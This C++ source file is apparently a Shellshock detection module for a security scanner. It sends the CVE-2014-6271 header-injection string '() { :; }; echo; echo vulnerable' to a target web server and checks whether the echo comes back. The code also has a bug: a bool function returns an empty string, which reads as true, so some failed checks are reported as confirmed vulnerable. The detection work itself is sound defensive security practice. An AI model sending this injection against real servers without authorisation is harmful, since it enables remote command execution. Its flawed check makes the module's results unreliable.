#include "../include/ShellshockDetector.h"
#include "../include/mitre/AttackMapper.h"
#include <iostream>
#include <optional>
#include <sstream>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define closesocket close
#endif

namespace {
    bool testShellshockVulnerability(const std::string& host, int port) {
        // Create HTTP request with Shellshock payload in User-Agent header
        std::stringstream request;
        request << "GET / HTTP/1.1\r\n";
        request << "Host: " << host << "\r\n";
        request << "User-Agent: () { :; }; echo; echo vulnerable\r\n";
        request << "Connection: close\r\n";
        request << "\r\n";
        
        std::string requestStr = request.str();
        
#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return false;
        }
#endif
        
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
#ifdef _WIN32
            WSACleanup();
#endif
            return false;
        }
        
        // Set timeout
        struct timeval timeout;
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            closesocket(sock);
#ifdef _WIN32
            WSACleanup();
#endif
            return false;
        }
        
        // Send request
        send(sock, requestStr.c_str(), requestStr.length(), 0);
        
        // Receive response
        char buffer[4096] = {0};
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        
        closesocket(sock);
#ifdef _WIN32
        WSACleanup();
#endif
        
        if (bytes_received > 0) {
            std::string response(buffer, bytes_received);
            // Check if "vulnerable" appears in response (our echo command)
            return response.find("vulnerable") != std::string::npos;
        }
        
        return "";
    }
} // end anonymous namespace

ModuleResult ShellshockDetector::run(const MockTarget& target) {
    // Check if target has HTTP service (often indicates web servers that might use CGI)
    if (!target.isServiceOpen("HTTP")) {
        return ModuleResult{
            "ShellshockDetector",
            false,
            "HTTP service not available on target - Shellshock typically affects web servers",
            std::nullopt,
            Severity::Low,
            target.id()
        };
    }

    // Get target IP (use mock IP if available, otherwise use target ID)
    std::string targetIp = target.id();
    if (target.ip().has_value()) {
        targetIp = target.ip().value();
    }

    try {
        // Simulate Shellshock vulnerability detection
        // In a real implementation, this would involve:
        // 1. Sending HTTP requests with malicious headers containing bash functions
        // 2. Checking for bash execution in responses
        // 3. Testing various CGI endpoints
        
        bool potentiallyVulnerable = false;
        std::string details = "HTTP service detected, checking for Shellshock vulnerability\n";
        
        // Simulate some basic checks
        if (target.id().find("bash") != std::string::npos || 
            target.id().find("cgi") != std::string::npos ||
            target.id().find("linux") != std::string::npos) {
            potentiallyVulnerable = true;
            details += "Target appears to use Bash/Linux, potentially vulnerable to Shellshock\n";
            details += "Affected versions: Bash 4.3 and earlier\n";
            details += "CVE-2014-6271 allows remote code execution through environment variables\n";
            details += "Common attack vectors: HTTP headers, CGI scripts, DHCP, SSH\n";
        }

        ModuleResult result;
        result.id = "ShellshockDetector";
        result.targetId = target.id();
        result.details = details;
        
        if (potentiallyVulnerable) {
            result.success = true;
            result.message = "Target potentially vulnerable to Shellshock (CVE-2014-6271)";
            result.severity = Severity::Critical;
            
            // Add MITRE ATT&CK intelligence
            auto& mapper = C3NT1P3D3::MITRE::AttackMapper::getInstance();
            auto technique = mapper.mapVulnerability("Shellshock");
            
            if (technique.has_value()) {
                result.attackTechniqueId = technique->techniqueId;
                result.attackTactics = {"Initial Access"};
                result.mitigations = technique->mitigations;
            }
            
            // Perform actual Shellshock vulnerability test
            if (testShellshockVulnerability(targetIp, 80)) {
                result.message = "Target confirmed vulnerable to Shellshock (CVE-2014-6271)";
            }
        } else {
            result.success = false;
            result.message = "Target does not appear vulnerable to Shellshock";
            result.severity = Severity::Low;
        }
        
        return result;
    }
    catch (const std::exception& ex) {
        return ModuleResult{
            "ShellshockDetector",
            false,
            std::string("Exception during Shellshock scan: ") + ex.what(),
            std::nullopt,
            Severity::Low,
            target.id()
        };
    }
}